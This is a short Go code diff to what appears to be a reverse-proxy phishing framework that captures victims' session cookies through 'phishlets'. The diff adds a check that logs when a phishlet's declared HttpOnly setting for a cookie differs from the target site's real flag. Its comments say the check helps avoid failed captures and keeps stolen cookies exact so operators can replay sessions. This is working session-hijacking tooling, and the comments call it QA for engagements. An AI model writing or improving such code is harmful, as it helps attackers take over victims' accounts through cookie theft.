@@ -1132,6 +1132,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if ok && (s.IsAuthUrl || !s.IsDone) {
 							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
 								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
+								checkCookieHttpOnlyDrift(pl, c_domain, ck.Name, ck.HttpOnly)
 								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
 							}
 						}
@@ -1582,6 +1583,26 @@ func normalizeResponseCookie(ck *http.Cookie) {
 			}
 		}
 		ck.Expires = exptime
+	}
+}
+
+// checkCookieHttpOnlyDrift compares the http_only modifier a phishlet author
+// declared for an auth token against the HttpOnly flag actually observed on
+// the origin's Set-Cookie header for that same cookie. A mismatch means the
+// phishlet has drifted from the live target site - a common cause of failed
+// captures - and is logged for engagement QA.
+//
+// This is a signal only: it never feeds back into what gets captured or
+// persisted. The observed value (ck.HttpOnly) must remain exactly what is
+// stored/exported for the session's cookie token, since operators re-import
+// captured cookies verbatim to replay a session, and a fabricated HttpOnly
+// flag would behave differently on import than the real one.
+func checkCookieHttpOnlyDrift(pl *Phishlet, domain string, name string, observedHttpOnly bool) {
+	if pl == nil {
+		return
+	}
+	if declared := pl.isTokenHttpOnly(domain, name); declared != observedHttpOnly {
+		log.Warning("phishlet drift: %s: %s: http_only declared=%t observed=%t", pl.Name, name, declared, observedHttpOnly)
 	}
 }
 
